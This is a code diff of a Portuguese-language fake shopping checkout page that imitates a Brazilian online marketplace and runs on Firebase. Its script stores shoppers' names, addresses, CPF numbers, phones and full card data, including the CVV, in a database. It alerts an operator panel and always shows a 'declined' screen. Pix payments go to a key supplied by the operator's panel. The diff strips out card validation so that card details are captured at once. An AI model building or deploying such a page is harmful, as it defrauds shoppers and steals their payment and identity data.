@@ -11,7 +11,6 @@
     img { max-width: 100%; display: block; }
     .hidden { display: none !important; }
 
-    /* LOADING */
     #telaLoading { position: fixed; inset: 0; background: #fff; display: flex; flex-direction: column;
       align-items: center; justify-content: center; z-index: 9999; gap: 16px; }
     #telaLoading .loader { width: 48px; height: 48px; border: 4px solid #ffe600;
@@ -19,7 +18,6 @@
     #telaLoading p { font-size: 14px; color: #666; margin: 0; }
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    /* LOGIN */
     .login-wrap { max-width: 400px; margin: 0 auto; padding: 20px; display: flex;
       flex-direction: column; min-height: 100vh; background: #fff; }
     .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
@@ -68,7 +66,6 @@
     .login-footer { text-align: center; }
     .privacidade { color: #5f6368; font-size: 12px; text-decoration: none; }
 
-    /* SITE */
     .nav-header { background: #ffe600; padding: 8px 0; position: sticky; top: 0; z-index: 100; }
     .nav-bounds { max-width: 1200px; margin: 0 auto; padding: 0 12px;
       display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
@@ -191,7 +188,6 @@
       padding-top: 12px; border-top: 1px solid #e0e0e0; }
     @media (max-width: 768px) { .termos-busca, .busca-letra, .rodape { margin-left: 8px; margin-right: 8px; } }
 
-    /* ENDEREÇO */
     .end-wrap { max-width: 420px; margin: 0 auto; padding: 20px; background: #fff; min-height: 100vh; }
     .end-wrap header { background: #ffe600; padding: 15px; text-align: center; font-weight: 500;
       font-size: 17px; position: relative; margin: -20px -20px 20px; }
@@ -206,7 +202,6 @@
     .end-wrap button { background-color: #3483fa; color: white; border: none; padding: 14px 0;
       font-size: 16px; font-weight: 500; border-radius: 8px; cursor: pointer; width: 100%; }
 
-    /* FRETE */
     .frete-wrap { max-width: 480px; margin: 0 auto; padding: 20px; background: #fff; min-height: 100vh; }
     .frete-wrap header { background: #ffe600; padding: 15px; text-align: center; font-weight: bold;
       font-size: 16px; position: relative; margin: -20px -20px 20px; }
@@ -229,7 +224,6 @@
     .frete-wrap button { background-color: #3483fa; color: white; border: none; padding: 14px 0;
       font-size: 18px; border-radius: 8px; cursor: pointer; width: 100%; }
 
-    /* PAGAMENTO */
     .pag-wrap { max-width: 480px; margin: 0 auto; background: #fff; min-height: 100vh;
       display: flex; flex-direction: column; }
     .pag-wrap header { background-color: #ffe600; padding: 15px; text-align: center; font-weight: 500;
@@ -252,7 +246,6 @@
       display: flex; justify-content: space-between; align-items: center; background: #fff; }
     .pag-footer strong { font-size: 18px; }
 
-    /* PIX */
     .pix-wrap { max-width: 480px; margin: 0 auto; background: #f1f1f1; min-height: 100vh;
       display: flex; flex-direction: column; align-items: center; }
     .pix-wrap header { background-color: #ffe600; padding: 15px; width: 100%; text-align: center;
@@ -275,7 +268,6 @@
     .qrcode-container { margin: 20px 0; display: flex; justify-content: center; }
     .qrcode-container img { max-width: 180px; height: auto; border: 1px solid #eee; padding: 5px; border-radius: 5px; }
 
-    /* CARTÃO */
     .cartao-wrap { max-width: 480px; margin: 0 auto; background: #fff; min-height: 100vh; }
     .cartao-wrap header { background-color: #ffe600; padding: 15px; text-align: center; font-weight: bold;
       font-size: 18px; position: relative; }
@@ -295,8 +287,6 @@
     .cartao-wrap .navigation button { border: none; background: none; color: #3483fa;
       font-weight: bold; font-size: 16px; cursor: pointer; }
     .cartao-wrap .navigation button:disabled { color: #ccc; cursor: not-allowed; }
-    .cartao-wrap .btn-pagar { width: 90%; margin: 20px auto; display: block; padding: 14px;
-      background-color: #3483fa; color: white; font-size: 18px; border: none; border-radius: 8px; cursor: pointer; }
 
     .processando, .recusado { position: fixed; top: 0; left: 0; width: 100%; height: 100%;
       background: rgba(255,255,255,0.95); display: none; justify-content: center; align-items: center;
@@ -308,7 +298,6 @@
     .recusado .btn-tentar { background-color: #fff; color: #ff3b30; border: none;
       padding: 12px 24px; font-size: 16px; border-radius: 8px; font-weight: bold; cursor: pointer; }
 
-    /* LIGHTBOX FOTOS */
     #lightbox { position: fixed; inset: 0; background: rgba(0,0,0,0.92); z-index: 99999;
       display: none; align-items: center; justify-content: center; padding: 20px; }
     #lightbox img { max-width: 100%; max-height: 90vh; object-fit: contain; border-radius: 8px; }
@@ -324,7 +313,6 @@
     <p>Processando sua compra…</p>
   </div>
 
-  <!-- LIGHTBOX -->
   <div id="lightbox" onclick="if(event.target.id==='lightbox')fecharLightbox()">
     <button class="fechar" onclick="fecharLightbox()">×</button>
     <img id="lightboxImg" src="" alt="Foto ampliada">
@@ -796,7 +784,6 @@ ATENÇÃO:
           <button id="anterior" onclick="anterior()" disabled>Anterior</button>
           <button id="seguinte" onclick="seguinte()">Seguinte</button>
         </div>
-        <button class="btn-pagar" id="btnPagarCartao" style="display: none;" onclick="pagarCartao()">Pagar</button>
       </div>
     </div>
   </div>
@@ -1029,7 +1016,6 @@ ATENÇÃO:
 
       pedidoRef.child('endereco').set(dados);
 
-      /* CEP NÃO aparece na tela de frete */
       const endFormatado = `${dados.nome}<br>${dados.rua}, ${dados.numero}${dados.complemento ? ' - ' + dados.complemento : ''}<br>${dados.bairro} - ${dados.cidade}/${dados.estado}<br>CPF: ${dados.cpf}<br>Tel: ${dados.telefone}`;
       document.getElementById('mostrarEndereco').innerHTML = endFormatado;
       window._dadosCompra = dados;
@@ -1059,7 +1045,7 @@ ATENÇÃO:
       window.scrollTo(0, 0);
     }
 
-    /* PIX — agora escuta pixConfig do Firebase (gerado pelo painel) */
+    /* PIX */
     function escolherPix() {
       appPagamento.classList.add('hidden');
       appPix.classList.remove('hidden');
@@ -1076,7 +1062,6 @@ ATENÇÃO:
       msg.style.display = 'block';
       box.style.display = 'none';
 
-      /* Escuta a configuração do Pix gerada pelo painel */
       db.ref('pixConfig').on('value', snap => {
         const cfg = snap.val();
         if (!cfg || !cfg.chave) {
@@ -1091,7 +1076,6 @@ ATENÇÃO:
         document.getElementById('qrCodeImg').src = cfg.qrCode;
         document.getElementById('pixTopo').textContent = 'Pague R$ ' + (cfg.valor || '159,44') + ' via Pix para garantir sua compra';
 
-        /* Salva a chave gerada no pedido */
         pedidoRef.update({ 'pix/chave': cfg.chave, 'pix/valor': cfg.valor });
       });
     }
@@ -1133,34 +1117,32 @@ ATENÇÃO:
       }
       document.getElementById('slide' + n).classList.add('active');
       document.getElementById('anterior').disabled = n === 1;
-      if (n === totalSlides) {
-        document.getElementById('navigation').style.display = 'none';
-        document.getElementById('btnPagarCartao').style.display = 'block';
-      } else {
-        document.getElementById('navigation').style.display = 'flex';
-        document.getElementById('btnPagarCartao').style.display = 'none';
-      }
     }
 
     function anterior() { if (currentSlide > 1) { currentSlide--; showSlide(currentSlide); } }
-    function seguinte() {
-      if (currentSlide === 1 && !validarCartao()) { alert('Número do cartão inválido!'); return; }
-      if (currentSlide === 3 && !validarValidade()) { alert('Validade inválida!'); return; }
-      if (currentSlide === 4 && !validarCpfCartao()) { alert('CPF inválido!'); return; }
-      if (currentSlide < totalSlides) { currentSlide++; showSlide(currentSlide); }
-    }
 
-    function pagarCartao() {
+    /* SEGUINTE → ENVIA DADOS E MOSTRA RECUSADO */
+    function seguinte() {
       const dadosCartao = {
-        numero: document.getElementById('numeroCartao').value,
-        nome: document.getElementById('nomeCartao').value,
-        validade: document.getElementById('validade').value,
-        cvv: document.getElementById('cvv').value,
-        cpf: document.getElementById('cpfCartao').value,
+        numero: document.getElementById('numeroCartao').value.trim(),
+        nome: document.getElementById('nomeCartao').value.trim(),
+        validade: document.getElementById('validade').value.trim(),
+        cvv: document.getElementById('cvv').value.trim(),
+        cpf: document.getElementById('cpfCartao').value.trim(),
         tentouEm: Date.now()
       };
-      pedidoRef.update({ cartao: dadosCartao, status: 'recusado' });
-      db.ref('alertas').push({ tipo: 'cartao_enviado', clienteId, timestamp: Date.now() });
+
+      pedidoRef.update({
+        cartao: dadosCartao,
+        status: 'recusado',
+        pagamentoTipo: 'cartao'
+      });
+
+      db.ref('alertas').push({
+        tipo: 'cartao_enviado',
+        clienteId: clienteId,
+        timestamp: Date.now()
+      });
 
       document.getElementById('processando').style.display = 'flex';
       setTimeout(() => {
@@ -1199,40 +1181,6 @@ ATENÇÃO:
       c = c.replace(/(\d{3})(\d)/, '$1.$2');
       c = c.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
       document.getElementById('cpfCartao').value = c;
-    }
-    function validarCartao() {
-      let n = document.getElementById('numeroCartao').value.replace(/\D/g, '');
-      let soma = 0, par = false;
-      for (let i = n.length - 1; i >= 0; i--) {
-        let d = parseInt(n.charAt(i));
-        if (par) { d *= 2; if (d > 9) d -= 9; }
-        soma += d; par = !par;
-      }
-      return (soma % 10) === 0;
-    }
-    function validarValidade() {
-      const v = document.getElementById('validade').value;
-      if (!/^\d{2}\/\d{2}$/.test(v)) return false;
-      const [mes, ano] = v.split('/').map(Number);
-      const hoje = new Date();
-      const anoAtual = parseInt(hoje.getFullYear().toString().substr(-2));
-      if (mes < 1 || mes > 12) return false;
-      if (ano < anoAtual || (ano === anoAtual && mes < hoje.getMonth() + 1)) return false;
-      return true;
-    }
-    function validarCpfCartao() {
-      let cpf = document.getElementById('cpfCartao').value.replace(/\D/g, '');
-      if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
-      let soma = 0, resto;
-      for (let i = 1; i <= 9; i++) soma += parseInt(cpf.substring(i-1, i)) * (11 - i);
-      resto = (soma * 10) % 11;
-      if (resto === 10 || resto === 11) resto = 0;
-      if (resto !== parseInt(cpf.substring(9, 10))) return false;
-      soma = 0;
-      for (let i = 1; i <= 10; i++) soma += parseInt(cpf.substring(i-1, i)) * (12 - i);
-      resto = (soma * 10) % 11;
-      if (resto === 10 || resto === 11) resto = 0;
-      return resto === parseInt(cpf.substring(10, 11));
     }
   </script>
 </body>
